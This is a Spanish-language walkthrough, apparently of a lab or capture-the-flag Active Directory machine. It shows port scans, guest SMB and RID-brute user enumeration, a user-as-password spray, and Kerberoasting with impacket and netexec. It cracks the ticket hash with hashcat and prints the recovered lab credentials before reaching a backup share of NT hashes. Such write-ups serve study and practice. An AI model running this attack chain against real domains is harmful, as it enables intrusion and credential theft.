
# ENUMERACIÓN

```shell
nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.114.135.170 -oG allPorts
```

```shell
[*] IP Address: 10.114.135.170
[*] Open ports: 53,88,135,139,445,464,593,636,3268,3269,3389,49664,49667,49673,49711,49800
```

```shell
nmap -p53,88,135,139,445,464,593,636,3268,3269,3389,49664,49667,49673,49711,49800 -sCV 10.114.135.170 -oN targeted
```


```shell
nxc smb 10.114.135.170
```


## Enumeración de recursos compartidos

```shell
nxc smb 10.114.135.170 --shares -u 'guest' -p ''
```

```shell
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
backup                          
C$                              Default share
IPC$            READ            Remote IPC
NETLOGON                        Logon server share
SYSVOL                          Logon server share
Users                           
```

## Enumeración de usuarios

```shell
nxc smb 10.114.135.170 -u guest -p '' --rid-brute | grep "SidTypeUser" | awk '{print $6}' | cut -d '\' -f2-2 | tee users.txt
```


Probamos a hace run ataque de User as Password

```shell
nxc smb 10.114.135.170 -u users.txt -p users.txt --no-bruteforce --continue-on-succes
```

Encontramos un usuario que utiliza el mismo usuario como contraseña

```ad-hint
ybob317::ybob317
```

# Explotación
## Kerberoasting
al tener unas credenciales validas así que podemos probar a hacer un ataque de `Kerberoasting` Se basa en listar todos los SPNs del dominio y poder solicitar los tickets de `TGS` para ellos.

```shell
impacket-GetUserSPNs -dc-ip 10.114.135.170 SOUPEDECODE.LOCAL/ybob317 -request
```

Tambien se puden obtener
```shell
nxc ldap 10.114.135.170 -u ybob317 -p ybob317 --kerberoasting
```

Nos lo guardamos en un fichero los hashes

Y los crackeamos
```shell
hashcat -m 13100 hashes /usr/share/wordlists/rockyou.txt
```

Descubrimos unas credenciales
```ad-hint
file_svc::Password123!!
```

## Enumeración de recursos compartidos
Enumeraremos los recursos compartidos a los que puede acceder este usuario

```shell
nxc smb 10.114.135.170 -u 'file_svc' -p 'Password123!!' --shares
```

encontramos
```shell
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
backup          READ            
C$                              Default share
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share
SYSVOL          READ            Logon server share
Users                           
```

Vemos el recurso compartido de `backup` que tenemos permisos de lectura sobre el procedemos a ver su contenido, dentro de el encontramoms un archvio con hashes NT


